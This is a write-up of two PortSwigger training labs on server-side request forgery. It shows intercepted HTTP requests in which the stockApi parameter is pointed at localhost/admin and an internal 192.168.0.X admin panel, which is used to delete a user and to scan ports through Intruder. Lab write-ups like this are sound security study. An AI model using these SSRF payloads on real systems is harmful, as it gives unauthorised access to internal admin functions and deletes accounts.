---
title: Portswigger SSRF Labs 1
date: 2026-10-27
categories:
  - - Writeups
tags:
  - Web
  - Portswigger
cover: /images/russted.jpeg
---

Tackling SSRF Labs from Portswigger

<!-- more -->

---


## Lab: Basic SSRF against the local server

### Description

>This lab has a stock check feature which fetches data from an internal system.
>To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

### Solve

Visiting a product page and intercepting the `Check stock` request:

```http
POST /product/stock HTTP/2
Host: 0ab6000404e463728086cbed000c005a.web-security-academy.net
Cookie: session=7hiK32cP0o3gIhk230wWDoAxEmfjsoUr; session=0K2oSbLNNidTi8KFq4ZQzhVSjl1xSUlZ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

The stockApi which is user-controlled accesses the server to check the products price. Trying to change the `stockApi` parameter and inspecting the response:

![](images/2324f.png)

We are able to access the admin panel . Now to Delete `carlos`:

![](images/4fdvgfd.png)

We get the error , we need to send the check cost request and make the delete action at that point:

```http
POST /product/stock HTTP/2
Host: 0ab6000404e463728086cbed000c005a.web-security-academy.net
Cookie: session=SQRaCY9WYv12OEd71nLFvaea2nGMitGY; session=0K2oSbLNNidTi8KFq4ZQzhVSjl1xSUlZ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

stockApi=http://localhost/admin/delete?username=carlos
```

![](images/fdgrtewg.png)

## Lab: Basic SSRF against another back-end system

### Description

>This lab has a stock check feature which fetches data from an internal system.
>To solve the lab, use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port `8080`, then use it to delete the user `carlos`.

### Solve

This Lab is similar to [[SSRF#Lab Basic SSRF against the local server]] . The only difference is we are supposed to try to forge a request to another backend server whose range is what we know . To do this we capture the `Check cost` request and send it ti intruder:

```http
POST /product/stock HTTP/2
Host: 0ae6003f034d4d47805080c8009400f5.web-security-academy.net
Cookie: session=chWPTby0wSnkykx2GCqXbqvERqQHr4yM
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 96

stockApi=http://192.168.0.$X$:8080/admin
```

and filter with the status code . Most requests have a 500 error code . Look for one with 200 code.

Then capture the `Check cost` request again and delete the user `carlos` using the internal admin url you got with the delete parameters.

